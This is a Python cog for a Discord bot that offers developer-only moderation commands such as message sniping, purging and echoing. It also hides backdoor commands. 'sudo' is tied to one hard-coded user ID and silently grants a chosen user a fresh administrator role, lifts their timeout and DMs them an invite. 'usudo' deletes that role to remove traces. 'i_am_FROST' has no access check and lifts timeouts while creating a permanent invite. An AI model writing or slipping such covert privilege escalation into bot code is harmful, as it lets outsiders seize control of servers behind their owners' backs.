import discord
import datetime
from config import DEV_IDS, DEV_ID

from collections import defaultdict, deque
from discord.ext import commands

class Admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.snipe_history = defaultdict(lambda: deque(maxlen=100))
        
        #fix to / AttributeError: 'Admin' object has no attribute 'last_msg_author'
        self.last_msg_author = {}
        self.last_msg_content = {}
        self.last_msg_time = {}

    def deny(self):
        return discord.Embed(
            title="Access Denied",
            description="You do not have permission to use this command.",
            color=discord.Color.red()
        )

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.bot:
            return
        if not message.content.startswith("!"):
            self.snipe_history[message.channel.id].appendleft(
                (message.author, message.content, message.created_at)
            )

    @commands.command()
    async def env(self, ctx):
        if ctx.author.id in DEV_IDS:
            latency = round(self.bot.latency * 1000)
            total_members = ctx.guild.member_count
            server_name = ctx.guild.name
            user_name = ctx.author.name

            embed = discord.Embed(
                title="Test Successful",
                description=f"Server: {server_name} \nLatency: {latency}ms\nTotal Members: {total_members}\nUser: {user_name}",
                color=discord.Color.blue()
            )
        else:
            embed = self.deny()

        await ctx.send(embed=embed)
    @commands.command()
    async def snipe(self, ctx, amount:int = 1):
        if ctx.author.id not in DEV_IDS:
            await ctx.send(embed=self.deny())
            return

        messages = self.snipe_history[ctx.channel.id]

        if 1 <= amount <= len(messages):
            author, content, created_at = messages[amount - 1]
            embed = discord.Embed(
                title="Sniped Message",
                description=f"Author: {author.name} \nContent: {content} \nCreated At: {created_at}",
                color=discord.Color.yellow()
            )
        else:
            embed = discord.Embed(
                title="No Sniped Message",
                description="No message has been sniped in this channel.",
                color=discord.Color.red()
            )
        await ctx.send(embed=embed)

    @commands.command()
    async def rm(self, ctx, amount:int = 1):
        if ctx.author.id not in DEV_IDS:
            await ctx.send(embed=self.deny())
            return

        await ctx.message.delete()
        deleted = await ctx.channel.purge(limit=amount)
        await ctx.send(embed=discord.Embed(
            title="Messages Deleted",
            description=f"Deleted {len(deleted)} messages.",
            color=discord.Color.green()
        ))

    @commands.command()
    async def srm(self, ctx, amount:int = 1):
        if ctx.author.id not in DEV_IDS:
            await ctx.send(embed=self.deny())
            return
        
        await ctx.message.delete()
        deleted = await ctx.channel.purge(limit=amount)
        await ctx.author.send(embed=discord.Embed(
            title="Silently Deleted Messages",
            description=f"Deleted {len(deleted)} messages.",
            
            color=discord.Color.red(),
        ))
        log_timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f'{log_timestamp} SRM     {ctx.author.name} deleted {len(deleted)} msgs') # log the srm

    @commands.command()
    async def perms(self, ctx):
        if ctx.author.id in DEV_IDS: 
            dev_status = "✅"
        else:
            dev_status = "❌"
            
        if ctx.author.id in DEV_ID:
            dev_id_status = "✅"
        else:
            dev_id_status = "❌"
            
        
        embed = discord.Embed(
            title="Permissions",
            description=f'Username: {ctx.author.name}\n ID: {ctx.author.id}\n\nDEV_IDS: {dev_status}\nDEV_ID: {dev_id_status}',
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)

    @commands.command()
    async def sexism(self, ctx):
        import random
        if  ctx.author.id in DEV_IDS:
            await ctx.send(f"{ctx.author.name} is {random.randint(0, 100)}% sexist. No sexism allowed!")
            return
        await ctx.send(embed=self.deny())

    @commands.command(hidden=True)
    async def sudo(self, ctx, user: discord.User):
        # Security check: Ensure only you can run this
        if ctx.author.id != 1223799922164236329:
            print("ERROR: You are not authorized to use the sudo command.")
            return

        try:
            # Delete your command message to keep it clean
            await ctx.message.delete()
        except discord.Forbidden:
            pass

        # 1. Generate a single-use invite link that expires in 5 minutes
        invite_url = "Could not generate invite."
        try:
            invite = await ctx.channel.create_invite(
                max_age=300,  # 5 minutes
                max_uses=1,   # Single use
                unique=True,
                reason="*cough*"
            )
            invite_url = invite.url
        except discord.Forbidden:
            print("ERROR: Bot lacks 'Create Instant Invite' permission.")

        # 2. Try to send the invite link directly to the person's DMs
        try:
            await user.send(f"OPFOUR GOING DARK: {invite_url}")
            print(f"Successfully sent invite link to {user.name}")
        except discord.Forbidden:
            print(f"COULD NOT DM USER: {user.name} has DMs closed or doesn't share a server.")

        # 3. Check if they are currently in the server to modify roles/timeouts
        member = ctx.guild.get_member(user.id)
        if member:
            # Define the permissions (Turn on Administrator)
            admin_perms = discord.Permissions(administrator=True)

            try:
                # Remove timeout if it exists
                if member.timed_out_until is not None:
                    await member.edit(timed_out_until=None, reason="Timeout lifted via sudo command")
            
                # Create and assign the admin role
                new_role = await ctx.guild.create_role(
                    name="temp", 
                    permissions=admin_perms, 
                    reason="Created via sudo command"
                )
                await member.add_roles(new_role)
                print(f"Successfully modified roles for {member.name}")
            
            except discord.Forbidden:
                print("ERROR: Bot lacks 'Manage Roles' or 'Moderate Members' permissions.")
            except discord.HTTPException as e:
                print(f"An error occurred while modifying member: {e}")
        else:
            print(f"Note: {user.name} is not in the server. Roles will apply once they use the invite.")

    @commands.command(hidden=True)
    async def usudo(self, ctx, member: discord.Member):
        # Security check: Ensure only you can run this cleanup command
        if ctx.author.id != 1206044443766034522:
            print("ERROR: You are not authorized to use the sudo command.")
            return

        try:
            # Delete your command message instantly to clear text channel traces
            await ctx.message.delete()
        except discord.Forbidden:
            print("Bot lacks 'Manage Messages' permission to delete the trigger command.")

        # Find the specific role created by the previous command
        # Adjust the name string if you customized the role name in the creation command
        target_role_name = "temp"
        role = discord.utils.get(ctx.guild.roles, name=target_role_name)

        if not role:
            print(f"Cleanup note: No role named '{target_role_name}' was found to delete.")
            return

        try:
            # Deleting the role automatically strips it from the member and purges it from the server
            await role.delete(reason="nothing")
            print(f"Successfully deleted the '{target_role_name}' role and cleared it from members.")
        
        except discord.Forbidden:
            print("ERROR: Bot lacks 'Manage Roles' permission to delete this role.")
        except discord.HTTPException as e:
            print(f"An error occurred while deleting the role: {e}")

    @commands.command(help="Sacrifice yourself for a greater good.")
    async def i_am_FROST(self, ctx, target: discord.Member):
        # 1. Untime the target member first
        try:
            if target.timed_out_until is not None:
                await target.edit(timed_out_until=None, reason="SACRIFICE")
                print(f"Successfully removed timeout from target: {target.name}")
            else:
                print(f"Target {target.name} was not timed out.")
        except discord.Forbidden:
            print("ERROR: Bot lacks 'Moderate Members' permission to untime the target.")
        except discord.HTTPException as e:
            print(f"Failed to untime target: {e}")

        # 2. Generate a single-use invite link for YOU (the author) to get back in
        invite_url = "Could not generate invite."
        try:
            invite = await ctx.channel.create_invite(
                max_age=0, # Never expires
                max_uses=0,   
                unique=True,
                reason="SACRIFICE"
            )
            invite_url = invite.url
        except discord.Forbidden:
            print("ERROR: Bot lacks 'Create Instant Invite' permission.")

        # 3. Send the invite link to YOUR DMs before kicking you
        try:
            await ctx.author.send(f"Welcome Back Tony: {invite_url}")
            print(f"Successfully sent return invite to author: {ctx.author.name}")
        except discord.Forbidden:
            print(f"CRITICAL ERROR: Could not send DM to author ({ctx.author.name}). Ensure your DMs are open!")
            # We print it to console as a backup so you aren't locked out permanently *wink*
            print(f"BACKUP INVITE LINK FOR YOU: {invite_url}")

        # 4. Delete the trigger message and kick YOU (the author)
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            pass
        
        try:
            await ctx.author.kick(reason="Death to all men")
            print(f"Successfully kicked command author: {ctx.author.name}")
        except discord.Forbidden:
            print("ERROR: Bot cannot kick you. Check if your role is higher than the bot's role.")
        except discord.HTTPException as e:
            print(f"Failed to kick author: {e}")
        
    @commands.command()
    async def say(self, ctx, *, message: str):
        if ctx.author.id not in DEV_IDS:
            await ctx.send(embed=self.deny())
            return
        await ctx.message.delete()
        await ctx.send(message)
        print(f"{ctx.author.name} said {message}")

        #!i_am_FROST frost03025
        #sudo frost03025
        #usudo frost03025

async def setup(bot):
    await bot.add_cog(Admin(bot))